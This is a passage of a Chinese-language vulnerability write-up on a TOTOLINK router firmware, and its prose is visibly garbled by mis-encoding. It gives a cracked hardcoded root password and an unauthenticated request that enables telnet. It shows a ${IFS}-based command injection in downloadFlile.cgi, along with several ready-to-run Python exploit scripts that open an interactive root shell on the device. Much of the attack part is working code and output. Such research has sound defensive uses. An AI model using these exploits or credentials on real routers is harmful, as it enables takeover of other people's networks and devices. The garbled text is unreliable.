‡æ˜¯TOTOLINKè·¯ç”±å™¨ï¼Œé¦–å…ˆå°†è·¯ç”±å™¨ä¸Šç”µå¹¶é€šè¿‡LANå£è·Ÿç”µè„‘è¿æ¥èµ·æ¥ï¼Œç„¶åè¾“å…¥`192.168.0.1`è¿›å…¥è·¯ç”±å™¨é…ç½®ç•Œé¢ï¼Œç”¨æˆ·åå’Œå¯†ç é»˜è®¤ä¸º`admin/admin`ã€‚\n\n**è§£å†³ç½‘ç»œå†²çª**ï¼šè¿›åˆ°é…ç½®ç•Œé¢çš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯æ›´æ”¹è·¯ç”±å™¨çš„å±€åŸŸç½‘è®¾ç½®ï¼Œå°†å…¶ç½‘æ®µæ”¹æˆé`192.168.0.x`ï¼ˆæˆ‘å°†å®ƒæ”¹æˆäº†`192.168.55.1`ï¼‰ã€‚è¿™ä¸€æ­¥çš„ç›®çš„æ˜¯é˜²æ­¢è·Ÿwifiçš„`192.168.0.1`å†²çªï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡`192.168.55.1`è¿›å…¥TOTOLINKçš„é…ç½®ç½‘é¡µç•Œé¢ã€‚\n\n**è®¾ç½®ä¸Šç½‘è·¯ç”±**ï¼šç”µè„‘åŒæ—¶è¿ä¸Šäº†WIFIï¼ˆé€šè¿‡æ— çº¿ç½‘å¡ï¼‰å’ŒTOTOLINKï¼ˆé€šè¿‡ç½‘çº¿ï¼‰ï¼Œå½“æˆ‘ä»¬è®¿é—®ç½‘ç»œæ—¶ï¼Œä¼šèµ°å“ªæ¡çº¿è·¯å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æ ¹æ®`route print`æ‰“å°å‡ºçš„æ´»åŠ¨è·¯ç”±è·ƒç‚¹æ•°ï¼ˆä¼˜å…ˆçº§ï¼‰å¯ä»¥çœ‹å‡ºï¼Œæ•°å€¼è¶Šå°çš„ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼Œå°±ä¼šé€‰æ‹©è¯¥é€šè·¯è®¿é—®äº’è”ç½‘ã€‚windows 10ä¸­è®¾ç½®è·ƒç‚¹æ•°çš„æ–¹å¼å¦‚ä¸‹ï¼šé«˜çº§ç½‘ç»œè®¾ç½®->æ›´æ”¹é€‚é…å™¨é€‰é¡¹->é€‰æ‹©æŸä¸€ç½‘å¡->å±æ€§->Inernetåè®®ç‰ˆæœ¬4->é«˜çº§->å»æ‰â€œè‡ªåŠ¨è·ƒç‚¹â€çš„å‹¾é€‰->è®¾ç½®æ¥å£è·ƒç‚¹æ•°ä¸ºä¸€ä¸ªè¾ƒå°çš„å€¼ï¼Œå¦‚5ã€‚\n\n**å¯»æ‰¾å±é™©åŠŸèƒ½**ï¼šåœ¨TOTOLINKçš„è®¾ç½®é¡µé¢ä¸Šï¼Œéšæ„ç‚¹å‡»æ¢ç´¢æ˜¯å¦æœ‰å±é™©åŠŸèƒ½å¯ä»¥å¼€å¯åé—¨ç­‰ã€‚\n\n## æ‰«æç«¯å£\n\nä½¿ç”¨`nmap -p 1-65535 192.168.55.1`å¯¹è·¯ç”±å™¨è¿›è¡Œå…¨ç«¯å£æ‰«æï¼ŒæŸ¥çœ‹æ˜¯å¦å¼€å¯sshï¼ˆ22ï¼‰ï¼Œtelnetï¼ˆ23ï¼‰ï¼Œmqttï¼ˆ1883ï¼‰ç­‰ç«¯å£ã€‚\n\n## è·å–å›ºä»¶\n\nåœ¨[totolinkå®˜ç½‘](http://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=15&ids=36)ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„å›ºä»¶ï¼Œæˆ‘ç”¨åˆ°çš„æ˜¯`V5.9c.1485_B20180122`è¿™ä¸ªç‰ˆæœ¬ã€‚\n\nä½¿ç”¨`binwalk -Me xxx`å¯¹å›ºä»¶è¿›è¡Œè§£åŒ…ï¼Œè§£å‡ºçš„å†…å®¹ä¸­ï¼Œåœ¨`squashfs-root/`è¿™ä¸ªç›®å½•ä¸‹æ˜¯è·¯ç”±å™¨ä¸­æ–‡ä»¶ç³»ç»Ÿçš„å…¨éƒ¨å†…å®¹ï¼Œæ ¹æ®è¿™ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶å¯ä»¥è¿›è¡Œé€†å‘åˆ†æä¸æ¼æ´æŒ–æ˜ã€‚\n\n**å¯»æ‰¾ç¡¬ç¼–ç **ï¼šè€ƒè™‘åˆ°åç»­get shelléœ€è¦ç”¨æˆ·å/å¯†ç ç™»å½•ç³»ç»Ÿï¼Œå…ˆé™æ€åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾æ˜¯å¦å­˜åœ¨ç¡¬ç¼–ç çš„æƒ…å†µï¼Œå¯¹`/etc/passwd`å’Œ`/etc/shadow`ç­‰æ–‡ä»¶è¿›è¡Œåˆ†æã€‚äº†è§£ä»¥ä¸Šä¸¤ä¸ªæ–‡ä»¶ï¼Œå‚è€ƒå¦‚ä¸‹ä¸¤ç¯‡æ–‡ç« ï¼š[/etc/shadow file in Linux Explained with Examples](https://www.computernetworkingnotes.com/linux-tutorials/etc-shadow-file-in-linux-explained-with-examples.html)ï¼Œ[Linux /etc/shadowï¼ˆå½±å­æ–‡ä»¶ï¼‰å†…å®¹è§£æï¼ˆè¶…è¯¦ç»†ï¼‰](http://c.biancheng.net/view/840.html)\n\næœ¬æ¬¡TOTOLINKè®¾å¤‡ä¸­ï¼Œåœ¨`/etc/shadow.sample`ä¸­æ‰¾åˆ°äº†rootçš„å¯†ç ã€‚å°è¯•åœ¨[cmd5ç½‘ç«™](https://cmd5.com/)ä¸Šè¿›è¡Œå¯†ç ç ´è§£ï¼Œç ´è§£ç»“æœä¸ºï¼š`cs2012`ã€‚\n\n```shell\n$ cat shadow.sample\nroot:$1$BJXeRIOB$w1dFteNXpGDcSSWBMGsl2/:16090:0:99999:7:::\nnobody:*:14495:0:99999:7:::\n```\n\n**ç–‘é—®ï¼šä¸ºä»€ä¹ˆä»`/etc/shadow.sample`ä¸­å¾—åˆ°çš„æ˜¯`/etc/shadow`çš„å¯†ç ï¼Ÿ**\n\nå…¨å±€æœç´¢å­—ç¬¦ä¸²\"shadow.sample\"ï¼Œä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶ä¸­å­˜åœ¨å¯¹è¿™ä¸ªæ–‡ä»¶çš„æ“ä½œï¼Œå°†è¯¥æ–‡ä»¶å¤åˆ¶åˆ°/var/shadowäº†ã€‚\n\n```shell\nsquashfs-root$ grep -rin shadow.sample\netc/init.d/rcS:79:cp /etc/shadow.sample /var/shadow\netc/init.d/rcS_GW:79:cp /etc/shadow.sample /var/shadow\n```\n\nå¦ï¼Œåœ¨binwalkè§£å‹çš„etcç›®å½•ä¸‹æŸ¥çœ‹ï¼Œå‘ç°/etc/passwdè½¯è¿æ¥åˆ°äº†/var/passwdï¼Œé‚£ä¹ˆ/etc/passwdçš„å€¼å°±æ˜¯/etc/shadow.sampleçš„å€¼ã€‚\n\n```shell\nsquashfs-root/etc$ ls -al\nlrwxrwxrwx  1 bling bling Â   11 1æœˆ  22  2018 passwd -> /var/passwd\nlrwxrwxrwx  1 bling bling Â   11 1æœˆ  22  2018 shadow -> /var/shadow\n```\n\n# å…ˆæ‹¿SHELL\n\n## éšè—çš„telnetåŠŸèƒ½\n\nåˆ†æå›ºä»¶ä¸­web_csteç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶å°±æ˜¯è·¯ç”±å™¨webæœåŠ¡å™¨ä¸­çš„å†…å®¹ã€‚å…¶ä¸­`home.asp`å°±æ˜¯æˆ‘ä»¬è®¿é—®`192.168.55.1`æ—¶çš„ä¸»é¡µé¢ã€‚è¿™äº›æ–‡ä»¶ä¸­ï¼Œ`telnet.asp`é¦–å…ˆæ˜ å…¥çœ¼å¸˜ï¼Œè¿™ä¸ªéš¾é“æ˜¯è·Ÿtelnetç›¸å…³çš„ï¼Ÿä¼šä¸ä¼šå¯ä»¥æ‰“å¼€telnetåŠŸèƒ½å‘¢ï¼Ÿæˆ‘ä»¬å°è¯•è®¿é—®ä¸€ä¸‹ã€‚\n\n```shell\n~/squashfs-root/web_cste$ ls -al\ntotal 152\ndrwxrwxr-x 10 bling bling Â 4096 1æœˆ Â 22 Â 2018 .\ndrwxrwxr-x 14 bling bling Â 4096 1æœˆ Â 22 Â 2018 ..\ndrwxrwxr-x Â 3 bling bling Â 4096 1æœˆ Â 22 Â 2018 adm\n-rwxr-xr-x Â 1 bling bling Â  627 1æœˆ Â 22 Â 2018 bottom.asp\ndrwxrwxr-x Â 3 bling bling Â 4096 8æœˆ Â  7 19:04 cgi-bin\nlrwxrwxrwx Â 1 bling bling Â  Â 15 1æœˆ Â 22 Â 2018 config.dat -> /var/config.dat\n-rwxr-xr-x Â 1 bling bling Â  Â 59 1æœˆ Â 22 Â 2018 empty1.htm\n-rwxr-xr-x Â 1 bling bling Â  Â 41 1æœˆ Â 22 Â 2018 empty2.htm\n-rwxr-xr-x Â 1 bling bling Â  Â 59 1æœˆ Â 22 Â 2018 empty3.htm\n-rwxr-xr-x Â 1 bling bling Â 1150 1æœˆ Â 22 Â 2018 favicon.ico\ndrwxrwxr-x Â 3 bling bling Â 4096 1æœˆ Â 22 Â 2018 firewall\nlrwxrwxrwx Â 1 bling bling Â  Â 10 1æœˆ Â 22 Â 2018 fwdir -> /tmp/fwdir\nlrwxrwxrwx Â 1 bling bling Â  Â 20 1æœˆ Â 22 Â 2018 fw_ln -> /var/cloudupdate.web\n-rwxr-xr-x Â 1 bling bling Â  162 1æœˆ Â 22 Â 2018 goLogin.htm\n-rwxr-xr-x Â 1 bling bling Â 2508 1æœˆ Â 22 Â 2018 home.asp\n-rwxr-xr-x Â 1 bling bling Â  636 1æœˆ Â 22 Â 2018 index.htm\ndrwxrwxr-x Â 3 bling bling Â 4096 1æœˆ Â 22 Â 2018 internet\ndrwxrwxr-x Â 3 bling bling Â 4096 1æœˆ Â 22 Â 2018 js\n-rwxr-xr-x Â 1 bling bling Â 6686 1æœˆ Â 22 Â 2018 left.asp\n-rwxr-xr-x Â 1 bling bling Â 7708 1æœˆ Â 22 Â 2018 login.asp\ndrwxrwxr-x Â 7 bling bling Â 4096 1æœˆ Â 22 Â 2018 mobile\ndrwxrwxr-x Â 3 bling bling Â 4096 1æœˆ Â 22 Â 2018 style\n-rwxr-xr-x Â 1 bling bling Â 1616 1æœˆ Â 22 Â 2018 telnet.asp\n-rwxr-xr-x Â 1 bling bling Â 3475 1æœˆ Â 22 Â 2018 test.asp\n-rwxr-xr-x Â 1 bling bling Â 3798 1æœˆ Â 22 Â 2018 title.asp\n-rwxr-xr-x Â 1 bling bling Â 1039 1æœˆ Â 22 Â 2018 top.asp\ndrwxrwxr-x Â 3 bling bling Â 4096 1æœˆ Â 22 Â 2018 wireless\n-rwxr-xr-x Â 1 bling bling 36999 1æœˆ Â 22 Â 2018 wizard.asp\n-rwxr-xr-x Â 1 bling bling Â 6551 1æœˆ Â 22 Â 2018 wizard_connect_state.asp\n```\n\nåœ¨æµè§ˆå™¨ä¸­è¾“å…¥`http://192.168.55.1/telnet.asp`ï¼š\n\n- æç¤ºè®©æˆ‘ä»¬ç™»å½• - é‚£å°±ç”¨`admin/admin`ç™»å½•\n- ç™»å½•åé‡å®šå‘åˆ°äº†è®¾ç½®é¡µé¢ - é‚£å°è¯•å†æ¬¡åœ¨æµè§ˆå™¨ä¸­è¾“å…¥`http://192.168.55.1/telnet.asp`è®¿é—®\n- æ­¤æ—¶è¿›å…¥telnetå¼€å…³ç•Œé¢ - è¯´æ˜æˆ‘ä»¬å¯ä»¥é€šè¿‡æµè§ˆå™¨è¿œç¨‹å¼€å¯æˆ–å…³é—­è·¯ç”±å™¨çš„telnetåŠŸèƒ½\n- å‰å°å¯æ§oråå°å¯æ§ï¼Ÿ - ä½¿ç”¨burpsuiteæŠ“åŒ…é‡æ”¾ï¼ŒéªŒè¯\"ç™»å½•åæ‰èƒ½è®¿é—®telnetåŠŸèƒ½\"çš„æ ¡éªŒæ˜¯åœ¨å‰ç«¯è¿˜æ˜¯åç«¯ã€‚\n\n### burpsuiteæŠ“åŒ…\n\nä»¥ä¸‹æ˜¯æŠ“åˆ°çš„â€œè®¾ç½®telnetä¸ºå¼€â€çš„http poståŒ…ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸ªCookieå­—æ®µã€‚å°è¯•å°†è¯¥Cookieåˆ é™¤åï¼Œé‡å‘httpåŒ…æ§åˆ¶telnetå¼€å…³ï¼Œå‘ç°ä¾ç„¶èƒ½å¤Ÿæ§åˆ¶æˆåŠŸã€‚è¯´æ˜è·¯ç”±å™¨çš„webæœåŠ¡å™¨ç«¯å¹¶æœªå¯¹ç™»å½•ä¸å¦åšæ ¡éªŒã€‚å› æ­¤ï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ª**å‰å°å¯æ§çš„telnetå¼€å…³åŠŸèƒ½**ï¼\n\n```\nPOST /cgi-bin/cstecgi.cgi HTTP/1.1\nHost: 192.168.55.1\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://192.168.55.1/telnet.asp\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 56\nCookie: SESSION_ID=2:1516628334:2\nConnection: close\n\n{\"topicurl\":\"setting/setTelnetCfg\",\"telnet_enabled\":\"1\"}\n```\n\n### telnet shell\n\nåˆ©ç”¨ä¸Šè¿°`telnet.asp`çš„åŠŸèƒ½æ‰“å¼€telnetï¼Œå†æ ¹æ®å›ºä»¶ä¸­åˆ†æåˆ°çš„ç¡¬ç¼–ç rootå¯†ç ï¼Œä¾¿å¯æ‹¿åˆ°è·¯ç”±å™¨çš„shelläº†ã€‚\n\n```shell\n$ telnet 192.168.55.1\nTrying 192.168.55.1...\nConnected to 192.168.55.1.\nEscape character is '^]'.\n\ncarystdio login: root\nPassword:\nRLX Linux version 2.0\n Â  Â  Â  Â  _ Â  Â  Â  Â  Â  _  _\n Â  Â  Â   | | Â  Â  Â  Â  | ||_|\n Â  _  _ | | _  _ Â   | | _ ____  _ Â  _  _  _\n  | |/ || |\\ \\/ / Â  | || |  _ \\| | | |\\ \\/ /\n  | |_/ | |/ Â   \\ Â  | || | | | | |_| |/ Â   \\\n  |_| Â  |_|\\_/\\_/ Â  |_||_|_| |_|\\____|\\_/\\_/\n\nFor further information check:\nhttp://processor.realtek.com/\n# ls\nbin Â  Â  Â  etc Â  Â  Â  init Â  Â   lighttp Â  proc Â  Â   sys Â  Â  Â  usr Â  Â  Â  web_cste\ndev Â  Â  Â  home Â  Â   lib Â  Â  Â  mnt Â  Â  Â  root Â  Â   tmp Â  Â  Â  var\n```\n\n### ä¸€é”®get shell\n\nä¸ºäº†å°è£…ä»¥ä¸Š\"æ‰“å¼€telnet\"+\"telnetè¿æ¥è·å–shell\"è¿‡ç¨‹ï¼Œé€šè¿‡ä¸€ä¸ªè„šæœ¬è·å¾—TOTOLINKè·¯ç”±å™¨çš„shellï¼Œäºæ˜¯æœ‰äº†å¦‚ä¸‹è„šæœ¬ï¼š\n\n```python\nfrom pwn import *\n\n#context(log_level=\"debug\")\n\nio = remote(\"192.168.55.1\",80)\nmsg2 = 'POST /cgi-bin/cstecgi.cgi HTTP/1.1\\r\\n'\nmsg2 += 'Host: 192.168.55.1\\r\\n'\nmsg2 += 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\\r\\n'\nmsg2 += 'Accept: */*\\r\\n'\nmsg2 += 'Accept-Language: en-GB,en;q=0.5\\r\\n'\nmsg2 += 'Accept-Encoding: gzip, deflate\\r\\n'\nmsg2 += 'Referer: http://192.168.55.1/telnet.asp\\r\\n'\nmsg2 += 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8\\r\\n'\nmsg2 += 'X-Requested-With: XMLHttpRequest\\r\\n'\nmsg2 += 'Content-Length: 56\\r\\n'\nmsg2 += 'Connection: close\\r\\n\\r\\n'\nmsg2 += '{\"topicurl\":\"setting/setTelnetCfg\",\"telnet_enabled\":\"1\"}'\n\nio.send(msg2)\nio.close()\n\nsleep(1)\n\naa = process([\"/usr/bin/telnet\",\"192.168.55.1\"])\naa.recvuntil(\"login\")\naa.sendline(\"root\")\naa.recvuntil(\"Password\")\naa.sendline(\"cs2012\")\naa.sendline(\"ls\")\naa.interactive()\n```\n\nç”¨request postçš„æ–¹æ³•ï¼š\n\n```python\nfrom pwn import *\nimport requests\n\nresponse = requests.post(\"http://192.168.55.1/cgi-bin/cstecgi.cgi\",data='{\"topicurl\":\"setting/setTelnetCfg\",\"telnet_enabled\":\"1\"}')\n\naa = process([\"/usr/bin/telnet\",\"192.168.55.1\"])\naa.recvuntil(\"login\")\naa.sendline(\"root\")\naa.recvuntil(\"Password\")\naa.sendline(\"cs2012\")\naa.sendline(\"ls\")\naa.interactive()\n```\n\n## å‰å°å‘½ä»¤æ³¨å…¥\n\nä¸Šä¸€æ­¥ä¸­ï¼ŒburpsuitæŠ“åŒ…é‡æ”¾â€œtelnetå¼€å…³â€å¯¹åº”è°ƒç”¨çš„urlæ˜¯`/cgi-bin/cstecgi.cgi`ï¼Œæ‰€ä»¥æˆ‘é¦–å…ˆè€ƒè™‘çš„æ˜¯æ£€è§†ä¸€é`/cgi-bin/`ç›®å½•ä¸‹çš„å…¶ä»–æ–‡ä»¶ï¼Œæ˜¯å¦å­˜åœ¨æ¼æ´ã€‚\n\næŸ¥çœ‹å›ºä»¶ä¸­çš„æ–‡ä»¶ç›®å½•ï¼Œæœ‰å¦‚ä¸‹æ–‡ä»¶ï¼Œä¾æ¬¡æ£€è§†æ¯ä¸ªæ–‡ä»¶ã€‚\n\n```shell\n~/squashfs-root/web_cste/cgi-bin$ ls -al\ntotal 92\ndrwxrwxr-x Â 3 bling bling Â 4096 8æœˆ Â  7 19:04 .\ndrwxrwxr-x 10 bling bling Â 4096 1æœˆ Â 22 Â 2018 ..\n-rwxr-xr-x Â 1 bling bling Â 8007 1æœˆ Â 22 Â 2018 cstecgi.cgi\n-rwxr-xr-x Â 1 bling bling Â 9015 1æœˆ Â 22 Â 2018 downloadFlile.cgi\n-rwxr-xr-x Â 1 bling bling Â  402 1æœˆ Â 22 Â 2018 ExportSettings.sh\n-rwxr-xr-x Â 1 bling bling Â  383 1æœˆ Â 22 Â 2018 ExportSyslog.sh\ndrwxrwxr-x Â 6 bling bling Â 4096 1æœˆ Â 22 Â 2018 .svn\n-rwxr-xr-x Â 1 bling bling 13671 1æœˆ Â 22 Â 2018 upload_bootloader.cgi\n-rwxr-xr-x Â 1 bling bling 16855 1æœˆ Â 22 Â 2018 upload.cgi\n-rwxr-xr-x Â 1 bling bling 12503 1æœˆ Â 22 Â 2018 upload_settings.cgi\n```\n\nIDAé€†å‘æŸ¥çœ‹è¿™äº›cgiæ–‡ä»¶ï¼Œå‘ç°å¤§é‡`system`å‡½æ•°çš„è°ƒç”¨ã€‚æƒ³åˆ°æ˜¯å¦ä¼šå­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œå› æ­¤æŸ¥çœ‹äº†æ‰€æœ‰çš„systemè°ƒç”¨ç‚¹ï¼Œç¡®è®¤å‚æ•°æ˜¯å¦å¤–éƒ¨å¯æ§ã€‚æœ€ç»ˆåœ¨`downloadFlile.cgi`çš„mainå‡½æ•°ä¸­æ‰¾åˆ°å¦‚ä¸‹æ¼æ´ï¼š\n\n> è¿™ä¸ªæ¼æ´åŸºæœ¬å°±æ˜¯ä¸ªwebshell\n\n```c\n Â v14 = (const char *)getenv(\"QUERY_STRING\");       //ä»QUERY_STRINGä¸­è§£æçš„å€¼ç»™v14\n Â memset(v24, 0, sizeof(v24));\n Â memset(v25, 0, sizeof(v25));\n Â sprintf(v24, \"echo QUERY_STRING:%s >/tmp/download\", v14);     //v14è¢«æ ¼å¼åŒ–æˆä¸€ä¸ªå­—ç¬¦ä¸²\n Â system(v24);          //å­—ç¬¦ä¸²è¢«å½“åšå‘½ä»¤æ‰§è¡Œï¼Œå¹¶æœªæ£€æŸ¥v14ä¸­æ˜¯å¦æœ‰ç‰¹æ®Šå­—ç¬¦ä¸²ã€‚æœ€ç»ˆå¯¼è‡´å‘½ä»¤æ³¨å…¥\n```\n\nç”¨ä¸€ä¸ªç®€å•çš„urlå°±èƒ½è§¦å‘ä»¥ä¸Šæ¼æ´ï¼š\n\n```bash\n#åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ä»¥ä¸‹é“¾æ¥ï¼Œ${IFS}ä¸­çš„IFSæ˜¯linuxç³»ç»Ÿçš„ä¸€ä¸ªå˜é‡ï¼Œç”¨è¿™ç§æ–¹å¼å¯ä»¥ç”Ÿæˆä¸€ä¸ªç©ºæ ¼ï¼Œå¯ç»•è¿‡å­—ç¬¦ä¸²ä¼ è¾“è¿‡ç¨‹ä¸­å¯¹ç©ºæ ¼çš„è¿‡æ»¤\nhttp://192.168.55.1/cgi-bin/downloadFlile.cgi?a=b;ls${IFS}-al;\n\n#è¿”å›å¦‚ä¸‹ï¼Œå°†è·¯ç”±å™¨ä¸­çš„ç›®å½•åŠæ–‡ä»¶ä¿¡æ¯æ‰“å°äº†å‡ºæ¥\nQUERY_STRING:a=b\ndrwxr-xr-x Â  Â 3 root Â  Â  root Â  Â  Â  Â  Â  Â 0 Jan Â 1 Â 1970 .\ndrwxr-xr-x Â  10 root Â  Â  root Â  Â  Â  Â  Â  Â 0 Jan Â 1 Â 1970 ..\ndrwxr-xr-x Â  Â 6 root Â  Â  root Â  Â  Â  Â  Â  Â 0 Jan Â 1 Â 1970 .svn\n-rwxr-xr-x Â  Â 1 root Â  Â  root Â  Â  Â  Â  Â 402 Jan Â 1 Â 1970 ExportSettings.sh\n-rwxr-xr-x Â  Â 1 root Â  Â  root Â  Â  Â  Â  Â 383 Jan Â 1 Â 1970 ExportSyslog.sh\n-rwxr-xr-x Â  Â 1 root Â  Â  root Â  Â  Â  Â  8007 Jan Â 1 Â 1970 cstecgi.cgi\n-rwxr-xr-x Â  Â 1 root Â  Â  root Â  Â  Â  Â  9015 Jan Â 1 Â 1970 downloadFlile.cgi\n-rwxr-xr-x Â  Â 1 root Â  Â  root Â  Â  Â  Â 16855 Jan Â 1 Â 1970 upload.cgi\n-rwxr-xr-x Â  Â 1 root Â  Â  root Â  Â  Â  Â 13671 Jan Â 1 Â 1970 upload_bootloader.cgi\n-rwxr-xr-x Â  Â 1 root Â  Â  root Â  Â  Â  Â 12503 Jan Â 1 Â 1970 upload_settings.cgi\n```\n\n### ä½¿ç”¨pwntoolså®Œæˆåˆ©ç”¨è„šæœ¬\n\nburpsuiteä¸­æŠ“åŒ…å¦‚ä¸‹ï¼Œé€šè¿‡æ”¹å˜urlä¸­ä¸¤ä¸ª`;`ä¹‹é—´çš„å‘½ä»¤ï¼ˆä¹Ÿå¯ç”¨å…¶ä»–æœ‰æ•ˆåˆ†éš”ç¬¦ï¼‰ï¼Œå¯ä»¥å®ç°å‘½ä»¤æ³¨å…¥ï¼Œå¹¶å°†å‘½ä»¤æ‰§è¡Œç»“æœè¿”å›ï¼ˆ`lighthttpd`çš„ç‰¹æ€§ï¼ŒæŠŠcgiè¿è¡Œçš„ç»“æœç”¨äºè¿”å›ï¼‰ã€‚\n\n```\nGET /cgi-bin/downloadFlile.cgi?a=b;ls${IFS}-al; HTTP/1.1\nHost: 192.168.55.1\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\n```\n\nåˆ©ç”¨pythonè„šæœ¬ï¼Œå°†ä»¥ä¸Šè¿‡ç¨‹å°è£…æˆshellå½¢å¼\n\n```python\nfrom pwn import *\n\n# context(log_level=\"debug\")\n\nmsg1 = \"GET /cgi-bin/downloadFlile.cgi?\"\nmsg2 = \" HTTP/1.1\\r\\n\"\nmsg2 += \"Host: 192.168.55.1\\r\\n\"\nmsg2 += \"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\\r\\n\"\nmsg2 += \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\"\nmsg2 += \"Accept-Language: en-GB,en;q=0.5\\r\\n\"\nmsg2 += \"Accept-Encoding: gzip, deflate\\r\\n\"\nmsg2 += \"Connection: close\\r\\n\"\nmsg2 += \"Upgrade-Insecure-Requests: 1\\r\\n\"\nmsg2 += \"Cache-Control: max-age=0\\r\\n\"\nmsg2 += \"\\r\\n\"\n\nprint \"Hello, welcome to magic TOTOLINK shell!\"\nprint \"You can use it like a linux shell\"\nprint \"Enjoy it yourself now~\"\n\nwhile(1):\n Â  Â try:\n Â  Â  Â  Â print \"$ \",\n Â  Â  Â  Â a = raw_input()\n Â  Â  Â  Â b = \"\"\n Â  Â  Â  Â for i in a:\n Â  Â  Â  Â  Â  Â if i == ' ':\n Â  Â  Â  Â  Â  Â  Â  Â b += \"${IFS}\"\n Â  Â  Â  Â  Â  Â elif(i == '\\n'):\n Â  Â  Â  Â  Â  Â  Â  Â break\n Â  Â  Â  Â  Â  Â else:\n Â  Â  Â  Â  Â  Â  Â  Â b += i\n Â  Â  Â  Â in_cmd = \"aabbcc;\"+b+\";\"\n Â  Â  Â  Â msg_send = msg1 + in_cmd + msg2\n Â  Â  Â  Â # print msg_send\n Â  Â  Â  Â io = remote(\"192.168.55.1\",80)\n Â  Â  Â  Â io.send(msg_send)\n Â  Â  Â  Â test_msg = io.recvuntil(\"aabbcc\\n\")\n Â  Â  Â  Â recv_msg = io.recv()\n Â  Â  Â  Â print recv_msg\n Â  Â  Â  Â io.close()\n Â  Â except:\n Â  Â  Â  Â pass\n```\n\n### ä½¿ç”¨requestså®Œæˆåˆ©ç”¨è„šæœ¬\n\næœ€ç»ˆçš„è„šæœ¬å¦‚ä¸‹ï¼š\n\n```python\nimport requests\n\nmsg1 = 'aabb;'\nmsg2 = ';'\n\nwhile(1):\n Â  Â print '$',\n Â  Â a = raw_input()\n Â  Â b = ''\n Â  Â for i in a:\n Â  Â  Â  Â if i == ' ':\n Â  Â  Â  Â  Â  Â b += \"$IFS$1\"\n Â  Â  Â  Â elif(i == '\\n'):\n Â  Â  Â  Â  Â  Â break\n Â  Â  Â  Â else:\n Â  Â  Â  Â  Â  Â b += i\n Â  Â msg3 = msg1 + b + msg2\n\n Â  Â response = requests.get(\"http://192.168.55.1/cgi-bin/downloadFlile.cgi\",params=msg3)\n\n Â  Â print response.text.replace(\"QUERY_STRING:aabb\",'')\n```\n\nè¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œé‡åˆ°äº†ä»¥ä¸‹é—®é¢˜ï¼š\n\n1ã€å¦‚ä½•ç”¨pythonä¸­requestæ¨¡å—æ¥å‘åŒ…ï¼Ÿ\n\nå‚è€ƒ[pythonâ€”â€”Requestæ¨¡å—](https://blog.csdn.net/qq_37616069/article/details/80376776)\n\n2ã€ä½¿ç”¨`response = requests.get(\"http://192.168.55.1/cgi-bin/downloadFlile.cgi?aabb;ls${IFS}-al;\")`æ— æ³•æˆåŠŸå¾—åˆ°è¿”å›å€¼ï¼Ÿ\n\nç¬¬ä¸€æ­¥ï¼Œå®šä½é—®é¢˜ã€‚\n\nrequest.get()å‘åŒ…ä¼šè‡ªåŠ¨å°†'{ }'è¿›è¡Œç¼–ç ï¼Œä½¿ç”¨wiresharkæŠ“åŒ…æŸ¥çœ‹å¦‚ä¸‹ã€‚\n\n```\nGET /cgi-bin/downloadFlile.cgi?aabb;ls$%7BIFS%7D-al; HTTP/1.1\nHost: 192.168.55.1\n```\n\nè€ŒæœåŠ¡ç«¯æ¼æ´è§¦å‘ç‚¹è¿˜æœªåˆ°è§£ç çš„ä½ç½®ï¼Œå¯¼è‡´`system(ls$%7BIFS%7D-al)`æ— æ³•è¢«å½“åšbashå‘½ä»¤æ‰§è¡Œã€‚\n\nç¬¬äºŒæ­¥ï¼Œå¯»æ‰¾è§£å†³æ–¹æ¡ˆã€‚\n\naï¼‰å°è¯•å…³é—­requests.get()å‘åŒ…è‡ªåŠ¨ç¼–ç çš„åŠŸèƒ½ï¼ŒgoogleæŸ¥è¯¢ä¸€é€šåï¼Œå‘ç°é™¤äº†æ”¹requestsæºç æ— å…¶ä»–åŠæ³•ã€‚æ•…æ”¾å¼ƒã€‚\n\nbï¼‰å°è¯•æœç´¢\"IFS å‘½ä»¤æ³¨å…¥\"ï¼Œå¯»æ‰¾æ˜¯å¦æœ‰å…¶ä»–çš„æ–¹æ³•è¾¾åˆ°`${IFS}`åŒæ ·çš„æ•ˆæœã€‚æœç„¶ï¼åœ¨[å‘½ä»¤æ³¨å…¥ç»•è¿‡æ–¹å¼æ€»ç»“](https://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/)è¿™ç¯‡æ–‡ç« ä¸­æ‰¾åˆ°äº†åŠæ³•ï¼Œå¦‚ä¸‹ã€‚\n\n```shell\n###ç©ºæ 